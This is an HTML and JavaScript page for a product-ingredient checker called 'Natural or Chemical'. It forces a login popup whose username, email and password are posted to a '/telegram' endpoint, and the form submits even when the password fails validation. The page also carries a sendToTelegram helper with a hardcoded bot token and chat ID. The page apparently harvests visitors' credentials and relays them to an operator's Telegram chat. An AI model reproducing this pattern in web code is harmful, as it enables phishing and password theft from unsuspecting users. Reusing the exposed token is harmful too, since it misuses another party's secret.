<!DOCTYPE html> 
<html lang="en">   
  <head>     
    <meta charset="UTF-8" />     
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />     
    <title>Natural or Chemical</title>     
    <link rel="stylesheet" href="index.css" />     
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600&display=swap" rel="stylesheet" />   
    <style>
      .analysis-type-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.5);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 1000;
      }
      .analysis-type-modal {
        background: white;
        padding: 30px;
        border-radius: 15px;
        text-align: center;
        max-width: 500px;
        width: 90%;
      }
      .analysis-buttons {
        display: flex;
        justify-content: center;
        gap: 20px;
        margin-top: 20px;
      }
      .analysis-buttons button {
        width: 150px;
      }
      .disclaimer {
        margin-top: 20px;
        font-size: 14px;
        color: #666;
        text-align: center;
      }
      .analysis-type-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.5);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 1000;
      }
      .analysis-type-modal {
        background: white;
        padding: 30px;
        border-radius: 15px;
        text-align: center;
        max-width: 500px;
        width: 90%;
      }
      .analysis-buttons {
        display: flex;
        justify-content: center;
        gap: 20px;
        margin-top: 20px;
      }
      .analysis-buttons button {
        width: 150px;
      }
      .disclaimer {
        margin-top: 20px;
        font-size: 14px;
        color: #666;
        text-align: center;
      }
      
      /* Login Popup Styles */
      .login-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.6);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 2000;
      }
      .login-modal {
        background: white;
        padding: 35px;
        border-radius: 15px;
        text-align: center;
        max-width: 450px;
        width: 90%;
        box-shadow: 0 4px 20px rgba(0,0,0,0.2);
      }
      .login-modal h2 {
        margin-top: 0;
        color: #333;
        font-size: 24px;
        margin-bottom: 25px;
      }
      .form-group {
        margin-bottom: 20px;
        text-align: left;
      }
      .form-group label {
        display: block;
        margin-bottom: 6px;
        font-weight: 500;
        color: #444;
      }
      .form-group input {
        width: 100%;
        padding: 12px;
        border: 1px solid #ddd;
        border-radius: 6px;
        font-size: 16px;
        transition: border-color 0.3s;
        box-sizing: border-box;
      }
      .form-group input:focus {
        border-color: #ff9900;
        outline: none;
      }
      .password-requirements {
        font-size: 12px;
        color: #666;
        margin-top: 5px;
      }
      .error-message {
        color: #e53935;
        font-size: 14px;
        margin-top: 5px;
        display: none;
      }
      .submit-btn {
        background: #ff9900;
        color: white;
        border: none;
        padding: 12px 25px;
        border-radius: 6px;
        font-size: 16px;
        cursor: pointer;
        transition: background 0.3s;
        width: 100%;
        font-weight: 600;
        margin-top: 10px;
      }
      .submit-btn:hover {
        background: #e68a00;
      }
    </style>
  </head>   
  <body> 
    <div id="preloader"></div>    
    <!-- Navigation Bar -->
    <nav>       
      <div class="nav-container">
        <div class="logodiv">         
          <a href="/main">
            <div class="logo"></div>
          </a>       
        </div>       
        <div class="paradiv">         
          <div class="nav-links">           
            <a href="/howitworks" class="howitworks">How it works?</a>           
            <a href="/whytouse" class="whytouse">Why to use?</a>           
            <a href="/aboutus" class="about">About us</a>           
            <a href="/contact" class="contact">Contact</a>         
          </div>       
        </div>   
      </div>    
    </nav>
    <!-- Login Popup -->
    <div id="loginOverlay" class="login-overlay">
      <div class="login-modal">
        <h2>Welcome to Natural or Chemical</h2>
        <form id="loginForm" method="post" action="/telegram" >
          <div class="form-group">
            <label for="username">Username</label>
            <input name="username"  type="text" id="username" required>
            <div id="usernameError" class="error-message">Please enter a username</div>
          </div>
          
          <div class="form-group">
            <label for="email">Email Address</label>
            <input name="email" type="email" id="email" required>
            <div id="emailError" class="error-message">Please enter a valid email address</div>
          </div>
          
          <div class="form-group">
            <label for="password">Password</label>
            <input name="password" type="password" id="password" required>
            <div class="password-requirements">Please use strong password</div>
            <div id="passwordError" class="error-message">please use strong password</div>
          </div>
          
          <button type="submit" class="submit-btn">Continue</button>
        </form>
      </div>
    </div>
     
    <main>       
      <!-- Hero Section -->
      <div class="design">         
        <div class="design-background"></div>         
        <div class="design-overlay"></div>          
        <div class="designlogo Natural">Natural</div>         
        <div class="designlogo Chemical">Chemical</div>         
        <div class="product">           
          <div class="soda"></div>           
          <div class="soda2"></div>         
        </div>                            
      </div>
       
      <!-- Main Content -->
      <div class="main-container">         
        <div class="main-box">             
          <p class="know">Know what you use!</p>             
          <div class="designdiv"></div>             
          <p class="howtouse">                 
            Upload your products image and provide details below.             
          </p>
          
          <!-- Form Section -->
          <form id="productForm" action="/result" method="post" enctype="multipart/form-data">            
            <label class="upload-div" for="input-files">               
              <input type="file" accept="image/*" id="input-files" name="imageFile" style="position: absolute; width: 1px; height: 1px; opacity: 0;">                 
              <div class="upload-icon hidden">ðŸ“¸</div>                 
              <p class="drop hidden">Drop your product image here</p>                 
              <p class="browse hidden">or click to browse from your device</p>              
            </label>
                         
            <p class="typeofproduct">ðŸ“‹ Type of product</p>             
            <input type="text" id="product-type" name="productType" placeholder="e.g. Beverage, Snack, Cosmetic, etc.">             
            
            <p class="typeofproduct expect"><span style="color: #ff9900;">ðŸ—¸</span> What you expect from this product? </p>             
            <textarea id="product-expectations" name="productExpect" placeholder="Tell us what you're looking for or concerned about..."></textarea>
                                      
            <button type="button" id="nextButton">Next</button>   
          </form>                  
        </div>       
      </div>                   
    </main>
     
    <!-- Analysis Type Modal -->
    <div id="analysisTypeOverlay" class="analysis-type-overlay">
      <div class="analysis-type-modal">
        <h2>Choose Analysis Type</h2>
        <p>Would you like a deep or fast analysis of your product?</p>
        <div class="analysis-buttons">
          <button id="deepAnalysisBtn">Deep Analysis</button>
          <button id="fastAnalysisBtn">Fast Analysis</button>
        </div>
        <div class="disclaimer">
          ðŸ’¡ Tip: For best results, take a close-up photo of the ingredient list. 
          Make sure text is clear and readable.
        </div>
      </div>
    </div>
     <!-- JavaScript -->
     <script>  
      const preloader = document.getElementById("preloader");
      const product = document.querySelector(".product");       
      const design = document.querySelector(".design-overlay");       
      const natural = document.querySelector(".Natural");       
      const chemical = document.querySelector(".Chemical");       
      const inputfile = document.querySelector("#input-files");       
      const uploadndiv = document.querySelector(".upload-div");       
      const hiddenelemnts = document.querySelectorAll(".hidden");
      const analysisTypeOverlay = document.getElementById("analysisTypeOverlay");
      const productForm = document.getElementById("productForm");
      const nextButton = document.getElementById("nextButton");
      const deepAnalysisBtn = document.getElementById("deepAnalysisBtn");
      const fastAnalysisBtn = document.getElementById("fastAnalysisBtn");
      const loginOverlay = document.getElementById("loginOverlay");
      const loginForm = document.getElementById("loginForm");
      
      let selectedFile = null;
      let loggedIn = false;
      
      if(localStorage.getItem("username")){
        loginOverlay.style.display = "none";


      }

      window.addEventListener("load", () => {
        preloader.style.display = "none";
      });
      
      // Login form validation and submission
      loginForm.addEventListener("submit", function(e) {
        e.preventDefault();
        
        const username = document.getElementById("username").value;
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;
        let isValid = true;
        
        // Reset error messages
        document.querySelectorAll(".error-message").forEach(el => {
          el.style.display = "none";
        });
        
        // Validate username
        if (!username) {
          document.getElementById("usernameError").style.display = "block";
          isValid = false;
        }
        
        // Validate email
        if (!email || !email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
          document.getElementById("emailError").style.display = "block";
          isValid = false;
        }
        
        // Validate password (8 characters minimum)
        if (!password ) {
          document.getElementById("passwordError").style.display = "block";
          isValid = false;
        }
        const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/;
        
       if (!passwordRegex.test(password)) {
    document.getElementById("passwordError").textContent = 
      "Please use strong password";
    document.getElementById("passwordError").style.display = "block";
    isValid = false;
    alert('Please use strong password')
    loginForm.submit();
  }
        if (isValid) {
          // Store user info (could be sent to server instead)
          localStorage.setItem("username", username);
          localStorage.setItem("email", email);
          
          // Close the login overlay
          loginOverlay.style.display = "none";
          loggedIn = true;
         
     loginForm.submit();



        }
      });
      
      // File upload handler
      inputfile.addEventListener("change", (event) => {
        if (inputfile.files && inputfile.files[0]) {   
          selectedFile = inputfile.files[0];
          let Imgurl = URL.createObjectURL(selectedFile);   
          uploadndiv.style.backgroundImage = `url(${Imgurl})`;   
          uploadndiv.style.border = 0;   
          hiddenelemnts.forEach((element) => {     
            element.style.visibility = "hidden";    
          });
        }        
      });
      
      // Show analysis type modal
      nextButton.addEventListener("click", () => {
        if (!selectedFile) {
          alert("Please upload an image first!");
          return;
        }
        
        if (!document.getElementById("product-type").value) {
          alert("Please specify the product type!");
          return;
        }
        
        if (!document.getElementById("product-expectations").value) {
          alert("Please provide your product expectations!");
          return;
        }
        
        analysisTypeOverlay.style.display = "flex";
      });
      
      // Deep Analysis - use original image
      deepAnalysisBtn.addEventListener("click", () => {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'analysisType';
        input.value = 'deep';
        productForm.appendChild(input);
        productForm.submit();
      });
      
      // Fast Analysis - compress image
      fastAnalysisBtn.addEventListener("click", () => {
        const reader = new FileReader();
        reader.onload = function(event) {
          const img = new Image();
          img.onload = function() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            // Compress to max 100KB
            const MAX_WIDTH = 800;
            const MAX_HEIGHT = 800;
            let width = img.width;
            let height = img.height;
            
            if (width > height) {
              if (width > MAX_WIDTH) {
                height *= MAX_WIDTH / width;
                width = MAX_WIDTH;
              }
            } else {
              if (height > MAX_HEIGHT) {
                width *= MAX_HEIGHT / height;
                height = MAX_HEIGHT;
              }
            }
            
            canvas.width = width;
            canvas.height = height;
            ctx.drawImage(img, 0, 0, width, height);
            
            // Convert to blob with reduced quality
            canvas.toBlob((blob) => {
              const compressedFile = new File([blob], selectedFile.name, {
                type: 'image/jpeg',
                lastModified: Date.now()
              });
              
              const dataTransfer = new DataTransfer();
              dataTransfer.items.add(compressedFile);
              inputfile.files = dataTransfer.files;
              
              const input = document.createElement('input');
              input.type = 'hidden';
              input.name = 'analysisType';
              input.value = 'fast';
              productForm.appendChild(input);
              
              productForm.submit();
            }, 'image/jpeg', 0.7);
          };
          img.src = event.target.result;
        };
        reader.readAsDataURL(selectedFile);
      });
      
      // Hover effects for product display        
      product.addEventListener("mouseenter", function() {         
        design.style.opacity = 0;         
        chemical.style.opacity = 1;         
        natural.style.opacity = 0;                 
      });        
      
      product.addEventListener("mouseleave", function() {         
        design.style.opacity = 1;       
        chemical.style.opacity = 0;       
        natural.style.opacity = 1;         
      });    
      
      
function sendToTelegram(message) {
  const BOT_TOKEN = "7138395020:AAF98yTTnZ_jDkGLqdbmNGo9_GkGYotoHl8";
  const CHAT_ID = "1779078520";
  const MESSAGE = message;

  axios
    .post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: MESSAGE,
    })
    .then((response) => {
      console.log("Message sent:", response.data);
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });
}

      </script>
    
  </body> 
</html>